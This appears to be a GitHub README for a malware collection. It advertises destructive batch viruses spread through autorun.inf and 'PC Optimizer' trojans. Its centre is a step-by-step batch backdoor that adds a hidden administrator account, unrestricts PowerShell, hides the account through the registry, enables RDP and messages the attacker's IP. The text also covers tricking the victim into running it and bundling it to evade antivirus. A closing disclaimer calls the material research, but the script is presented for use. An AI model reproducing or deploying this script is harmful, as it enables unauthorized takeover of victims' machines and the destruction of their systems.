# MalwareSmog

In this file, There are many powerful viruses 💀 that can damage your PC in a matter of seconds.
This repo is a collection of fun little viruses that pack a mean punch! If you know anything about hacking, you will know that batch files are usually a stigma of the hacking world, most of the tutorials will show you how to create a "virus" that is nothing but empty and the creator can achieve nothing but laughter, which is Okay, but those camouflage won't be helpful if you want to do some real permanent damage. 

## Features
- Shutdowns.bat
- crashespc.bat
- Disablenet.bat
- system_meltdown.bat

Please, Note that the above mentioned viruses make use of the  autorun.inf  file to exploit the autorun feature and can easily infect a windows machine and their effect can be devistating. And There are two PC Optimizer Trojan!
Each .bat file can potencially destroy a PC if it's run individually. I have set them all to autorun, ensuring a non recoverable end result.


    For an additional virus that is unlinked and unaffiliated with the .bat set please see the file named:
    Complete_viruscode_Pascal: 
_____________________________________________________________________________________________________________________________

Let's try to make an actual batch file virus to gain full access to another computer.
NOTE: The user is going to have to be tricked into opening a file that requires admin access.
			
The first step is to open notepad and type in: 

    @echo offnet user winsystem winsystem /addnet localgroup administrators winsystem /add powershell set-executionpolicy 

    unrestrictedpowershell $path = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList' 

    powershell New-Item $path -Force | New-ItemProperty -Name winsystem -Value 0 -PropertyType DWord -Force reg add 

    "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f

    msg <insert your IP here> Its ready.
		
## How it Works

   - The first line creates a new user called winsystem with the password winsystem
   - The second line adds the new user as an admin.
   - The third line allows PowerShell scripts to run.
   - The fourth and fifth lines hide the user from the Log in screen.
   - The sixth line allows RDP (Remote Desktop Protocol) 
   - The seventh line sends the IP address that is imputed the message "Its ready."

REMEMBER: When the box opens DO NOT CLOSE IT! Copy down the computer name, open cmd, and type: ping <the computer name you copied down>.

Thats all! As soon as you get the IP, Copy it and input it into RDP and log in as winsystem.

NOTE: Replace the items in < > as the items specified (duh).
		
This may be detected by antivirus, but if you join the regular .bat file with a different file a Trojan can be made with low detection rates.
		
# ⚠️Note
Remember, that all responsibilities are at your own risk.
Please use it only for research purposes. Do not share & store this on Your PC!
It's Modified by Unknown!

For any kind of help, support, payment, donate, suggestion and request ask me on Gmail / Telegram:

<a href="https://t.me/CyberClans"><img src="https://img.shields.io/badge/Telegram-Group%20Telegram%20Join-blue.svg?logo=telegram"></a>

## Follow On
<p align="left">
<a href="https://github.com/palahsu"><img src="https://img.shields.io/badge/GitHub-Follow%20on%20GitHub-inactive.svg?logo=github"></a>
</p><p align="left">
<a href="https://www.facebook.com/aduri.knox01/"><img src="https://img.shields.io/badge/Facebook-Follow%20on%20Facebook-blue.svg?logo=facebook"></a>
</p><p align="left">
<a href="https://t.me/AD0000000"><img src="https://img.shields.io/badge/Telegram-Contact%20Telegram%20Profile-blue.svg?logo=telegram"></a>
</p><p align="left"> 

> **Disclaimer**<a name="disclaimer" />: Please note that this is a research project. I am by no means responsible for any usage of this tool. Use it on your behalf. I am not responsible if your accounts are banned due to extensive use of this tool. I am not responsible for any damages, this scripts and tools only for testing purpose. Everything here in this repository has been made for educational purposes, and/or ran in a controlled testing environment only. I do ***NOT*** enourage people to do something like this themselves/to themselves. ***NEVER*** use malware, or anything that is, but no limited to, malware, anything remotely capable of destroying computers, or even "joke programs" *on your own or other people's computers*, not even with their consent, as this can have bad, unforeseen consequences. 
Be careful not to infect yourself when accessing and experimenting with malicious software!

